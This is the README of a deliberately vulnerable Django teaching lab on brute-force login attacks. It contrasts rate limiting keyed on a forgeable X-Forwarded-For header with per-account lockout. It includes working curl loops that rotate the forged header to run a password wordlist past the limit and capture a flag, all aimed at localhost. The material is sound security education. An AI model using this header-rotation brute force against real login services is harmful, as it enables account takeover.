# Lab 11 — Brute Force & Credential Stuffing

Companion lab for the blog post
**[Brute Force & Credential Stuffing](https://thiagoteixeira.tech/blog/)** (Series III).

| | |
|---|---|
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **CWE** | CWE-307 — Improper Restriction of Excessive Authentication Attempts |
| **ASVS** | V2.2.1 — anti-automation controls against credential testing |
| **Detection** | **No scanner tier finds it** — Bandit, Semgrep community, *and* the audit tier all miss. The gate is `tests.py` + a dynamic `curl` probe (see Scanning it) |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The two views

| View | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | rate-limits on the **first `X-Forwarded-For` hop** — a value the client types |
| Secure | [`views_secure.py`](views_secure.py) | counts failures **per account** (the username), immune to source rotation |

Both are login endpoints for a seeded `victim` whose **deliberately weak**
password (`summer2024`) sits at the end of the attacker's wordlist. The flag is
in the victim's private note; cracking the login and reading the note captures
it. A successful attack is visible in what you *reach* — the correct password and
then the flag — not merely in a status code.

The one line that matters is the **key**:

```python
# vulnerable — bucket per (forgeable) source address
key = f"bf:vuln:{client_ip_from_forwarded_for(request)}"   # rotate XFF -> new bucket every request

# secure — bucket per account being attacked
key = f"bf:secure:{username.lower()}"                       # rotation cannot dodge it
```

The limiter helpers live in [`_throttle.py`](_throttle.py) (a tiny hand-rolled
cache counter — 5 failures per 5-minute window). The lab is about *what the
counter is keyed on*, not the machinery. In production you would not hand-roll
this: **`django-axes`** counts per account in a shared store and is the answer
the post recommends.

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d          # Postgres + Django on http://127.0.0.1:8000 (background)
```

The seed creates `victim` (weak password, holds the flag). On Windows PowerShell
`curl` is an alias for `Invoke-WebRequest` — use `curl.exe`, or Git Bash.

## Test the pair from the command line

**1. The naive flood is blocked** — hammer the vulnerable view from one source
and the limit trips after 5:

```bash
for n in 1 2 3 4 5 6; do
  curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-For: 203.0.113.9" \
    -d "username=victim&password=wrong$n" http://127.0.0.1:8000/brute-force/vulnerable/login/
done
# 401 401 401 401 401 429   <- looks like protection
```

**2. One header turns it off** — rotate the forged `X-Forwarded-For` and every
request gets a fresh bucket, from a single machine, so the wordlist runs to the
end and the correct password logs you in:

```bash
i=0
for pw in 123456 password qwerty letmein iloveyou admin summer2024; do
  curl -s -o /dev/null -w "try$((i+1)) $pw -> %{http_code}\n" -c jar.txt -b jar.txt \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "username=victim&password=$pw" http://127.0.0.1:8000/brute-force/vulnerable/login/
  i=$((i+1))
done
# try1..6 -> 401,  try7 summer2024 -> 200   <- cracked, unthrottled
```

**3. Capture the flag** with the cracked session:

```bash
curl -s -b jar.txt http://127.0.0.1:8000/brute-force/note/ | grep -o 'FLAG{[^}]*}'
# FLAG{brute_force_ip_ratelimit_bypassed}
```

**4. The fix holds under the same attack** — the secure view keys on the account,
so rotating the source cannot dodge it; it locks before the password is reached:

```bash
i=0
for pw in 123456 password qwerty letmein iloveyou admin summer2024; do
  curl -s -o /dev/null -w "try$((i+1)) $pw -> %{http_code}\n" \
    -H "X-Forwarded-For: 172.16.0.$i" \
    -d "username=victim&password=$pw" http://127.0.0.1:8000/brute-force/secure/login/
  i=$((i+1))
done
# try1..5 -> 401,  try6 onward -> 403   <- account locked, summer2024 never reached
```

A correct password on an un-locked account still returns `200` — legitimate users
are not punished. Prove all of it in one command (from the repo root):

```bash
docker compose run --rm web python manage.py test labs.post_11_brute_force
```

## Isolation

This lab teaches authentication rate-limiting and nothing else. The note view is
a plain `@login_required` read of the caller's *own* note (no object id in the
URL — that keeps it clear of IDOR, Post 6); no raw SQL; output escaped. Password
*strength* and *hashing* are out of scope on purpose — the weak password is a
prop so the wordlist is short; policy is Post 13 and storage is Post 18.

## Scanning it

This is the lab where **no scanner tier helps** — and that is the lesson. The two
flaws are *the wrong key* (semantic) and *a missing control* (an absence); static
analysis can match neither.

```bash
bandit -r labs/post_11_brute_force/                 # only B105 noise on the seed's weak password
semgrep scan --config p/django --config p/python --config p/owasp-top-ten labs/post_11_brute_force/   # 0 findings
semgrep scan --config r/python.django --config r/python labs/post_11_brute_force/                     # audit tier: only unrelated nits
```

So there is **no custom rule** and **no CI scan-assert** for this class — its gate
is `tests.py` (the universal one). It is not a **DAST** target either: brute force
has no response signature (its symptom is volume, which is a load test), a scanner
cannot safely probe for a missing control without hammering the endpoint into a
denial-of-service, and — worst of all — a generic tool run against
`vulnerable/login/` *without* rotating the header is blocked after five tries and
reports the endpoint as **protected**, a clean false negative. So the automatable
signal is **dynamic and hand-aimed**: the `curl` loop above rotates a forged
header and watches the IP-keyed limit fail to trigger while the per-account
lockout holds. Full reasoning and the captured runs are under [`scans/`](scans/)
and [`scans/README.md`](scans/README.md). That honest result — *some findings come
from a threat-model review and a dynamic probe, not a scanner* — is the whole
point of shipping this lab without a rule.

Bandit and Semgrep are pinned but **not bundled in the lab image** (same as CI).
Install them on the host — `pip install bandit==1.9.4 semgrep==1.170.0` — or
prefix a command with `docker compose run --rm web sh -c "..."`. All commands run
from the repository root.
